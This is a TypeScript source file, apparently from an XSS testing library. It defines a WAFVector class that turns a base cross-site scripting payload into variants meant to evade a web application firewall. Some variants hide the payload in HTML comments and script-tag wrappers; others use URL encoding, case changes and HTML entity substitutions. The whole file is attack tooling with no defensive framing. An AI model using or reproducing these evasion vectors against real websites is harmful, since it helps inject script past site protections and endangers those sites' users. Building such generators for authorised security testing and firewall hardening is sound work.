/**
 * WAF bypass vectors.
 * @description Web Application Firewall evasion.
 */
export class WAFVector {
  /**
   * Get all WAF vectors.
   * @description Returns all WAF bypass variations.
   * @param payload - Base XSS payload
   * @returns Array of WAF bypass XSS strings
   */
  static all(payload: string): string[] {
    return [...this.encodingVariations(payload), ...this.commentObfuscation(payload)]
  }

  /**
   * Get comment vectors.
   * @description Payload hidden in HTML comments.
   * @param payload - Base XSS payload
   * @returns Array of comment-obfuscated XSS strings
   */
  static commentObfuscation(payload: string): string[] {
    return [
      `<!--${payload}-->`,
      `<!--comment-->${payload}`,
      `${payload}<!--comment-->`,
      `<!--comment-->${payload}<!--comment-->`,
      `<!--<script>${payload}<!--</script>-->`,
      `<script><!--${payload}--></script>`,
      `<script>${payload}<!--comment--></script>`,
      `<!--comment--><script>${payload}</script><!--comment-->`,
      `<!--/**//-->${payload}<!--/-->`,
      `<!--<!--${payload}-->-->`,
      `${payload}<!--/**/-->`,
      `<!--/*-->${payload}<!--*/-->`,
      `${payload}<!--<script>-->`,
      `<script><!--${payload}-->`,
      `<!--${payload}--></script>`,
      `<script>${payload}<!--></script>-->`
    ]
  }

  /**
   * Get encoding vectors.
   * @description Multiple encoding variations.
   * @param payload - Base XSS payload
   * @returns Array of encoded XSS strings
   */
  static encodingVariations(payload: string): string[] {
    const variations = []
    variations.push(encodeURIComponent(payload), encodeURI(payload))
    variations.push(
      payload.toUpperCase(),
      payload.toLowerCase(),
      payload
        .replace(/a/g, 'A')
        .replace(/e/g, 'E')
        .replace(/i/g, 'I')
        .replace(/o/g, 'O')
        .replace(/u/g, 'U')
    )
    variations.push(
      payload.replace(/</g, '&lt;'),
      payload.replace(/>/g, '&gt;'),
      payload.replace(/"/g, '&quot;'),
      payload.replace(/'/g, '&#39;'),
      payload.replace(/ /g, '&nbsp;')
    )
    return variations
  }
}
